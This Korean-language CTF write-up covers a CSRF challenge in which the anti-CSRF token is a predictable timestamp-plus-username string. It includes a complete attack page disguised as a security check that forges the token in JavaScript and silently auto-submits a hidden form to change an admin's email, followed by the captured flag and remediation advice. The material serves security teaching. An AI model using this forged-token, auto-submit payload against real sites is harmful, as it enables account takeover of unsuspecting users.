+++
title = "VulnABLE CTF [LUXORA] Write-up: CSRF 🥈 Silver"
description = "LUXORA 플랫폼의 Silver 난이도 CSRF 공략 - 예측 가능한 CSRF Token을 우회하는 패턴 유추 공격 롸잇업"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "CSRF", "Silver", "Token Bypass", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: CSRF 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Client-Side Layer (CSRF)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/csrf/silver`
- **목표**: 서버가 Anti-CSRF Token 방어를 도입했으나, 토큰의 생성 알고리즘이 예측 가능(Predictable)한 점을 노려, 피해자의 토큰을 유추하고 악성 폼에 하드코딩하여 CSRF 공격을 성공시켜라.

---

## 🕵️‍♂️ 1. 정보 수집 및 인증 플로우 분석 (Reconnaissance)

`/csrf/silver` 의 이메일 변경 폼 소스코드를 살펴봅니다. Bronze와 달리 `csrf_token` 이라는 숨겨진 필드가 추가되었습니다.

**[서버에서 렌더링된 폼]**
```html
<form action="/csrf/silver/update-email" method="POST">
  <!-- CSRF 방어용 토큰 -->
  <input type="hidden" name="csrf_token" value="1698860000_user">
  <input type="text" name="email" value="user@luxora.test">
  <button type="submit">Update</button>
</form>
```

새로고침을 여러 번 해가며 토큰의 변화 패턴을 수집합니다.
1. `1698860000_user`
2. `1698860010_user`
3. `1698860015_user`

**[해커의 사고 과정]**
1. 토큰이 무작위 난수(UUID 등)가 아니라, 이전에 Account Takeover(Silver)에서 봤던 **`[UNIX 타임스탬프]_[유저명]`** 구조다!
2. CSRF 토큰은 요청이 발생할 때마다 서버가 시간을 기준으로 생성하는 것 같다.
3. 만약 내가 악성 사이트에 폼을 만들어두고, 자바스크립트를 이용해 현재 시간을 동적으로 구해서 `[현재시간]_admin` 이라는 문자열을 `csrf_token` 란에 채워 넣은 뒤 전송시킨다면?
4. 서버는 "시간과 이름이 맞으니 정상 토큰이군!" 하고 속을 것이다!

---

## 💥 2. 취약점 식별 및 악성 스크립트 작성 (Exploitation)

CSRF 토큰은 완벽한 '무작위성(Entropy)'이 생명입니다. 예측 가능한 토큰은 없는 것과 같습니다.

### 💡 동적 CSRF 페이로드(HTML/JS) 설계
해커의 사이트(`evil-attacker.com`)에 다음과 같이 현재 시간을 기반으로 가짜 토큰을 생성하는 자바스크립트가 포함된 HTML을 작성합니다.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Checking your security...</title>
</head>
<body>
    <h1>Please wait...</h1>
    
    <form id="csrf_form" action="http://localhost:3000/csrf/silver/update-email" method="POST" target="hidden_iframe">
        <!-- JS로 채워질 빈 토큰과 해커의 이메일 -->
        <input type="hidden" name="csrf_token" id="csrf_token" value="">
        <input type="hidden" name="email" value="hacker@evil.com">
    </form>
    
    <iframe name="hidden_iframe" style="display:none;"></iframe>
    
    <script>
        // 1. 현재 UNIX 타임스탬프 구하기
        const currentTime = Math.floor(Date.now() / 1000);
        
        // 2. 타겟 유저(admin)에 맞게 예측된 토큰 조립
        const forgedToken = currentTime + "_admin_super";
        
        // 3. 폼에 가짜 토큰 삽입
        document.getElementById("csrf_token").value = forgedToken;
        
        // 4. 강제 제출 (Auto-submit)
        document.getElementById("csrf_form").submit();
    </script>
</body>
</html>
```

---

## 🚀 3. 공격 수행 및 결과 확인

### Step 1. 악성 링크 전송
이 HTML 페이지의 링크를 챌린지 봇(관리자)에게 전송하여 접속을 유도합니다.

### Step 2. 서버의 반응 및 플래그 획득
관리자가 페이지에 접속하는 순간, 해커가 만든 자바스크립트는 브라우저의 시간을 읽어내어 `1698860123_admin_super` 형태의 가짜 토큰을 만들어 냅니다.
이 토큰이 관리자의 세션 쿠키와 함께 서버로 전송됩니다.

서버는 다음과 같이 검증합니다.
"요청받은 토큰의 시간이 현재 서버 시간과 거의 일치하고, 유저 이름도 맞네? 정상 요청 통과!"

```text
[!] System: Admin email changed successfully despite CSRF Token.
FLAG: FLAG{CSRF_🥈_WEAK_TOKEN_E5F6G7}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

CSRF 방어의 핵심인 '동기화 토큰(Synchronizer Token)'을 도입했음에도 불구하고, 그 토큰의 값이 해커가 유추 가능한 수학적 공식(시간+유저명)에 기반했기 때문에 방어망이 순식간에 뚫려버렸습니다.

**🔥 획득한 플래그:**
`FLAG{CSRF_🥈_WEAK_TOKEN_E5F6G7}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
CSRF 토큰은 세션 ID와 마찬가지로 절대 예측 불가능한 암호학적 난수여야 합니다.

* **안전한 패치 가이드 (강력한 토큰 생성)**
서버 사이드 프레임워크가 제공하는 검증된 CSRF 방어 라이브러리(Node.js의 `csurf`, Spring Security의 `CsrfTokenRepository`)를 사용해야 합니다.

```javascript
// Node.js (csurf 미들웨어) 사용 예시
const csurf = require('csurf');
const csrfProtection = csurf({ cookie: true });

app.use(csrfProtection);

// 렌더링 시
app.get('/form', function (req, res) {
  // csurf가 생성해준 암호학적 난수 토큰을 폼에 전달
  res.render('send', { csrfToken: req.csrfToken() })
});
```
프레임워크가 만들어주는 토큰은 64바이트 이상의 고엔트로피 해시값이므로, 해커가 외부에서 자바스크립트로 추측하여 끼워 넣는 것이 아예 불가능합니다.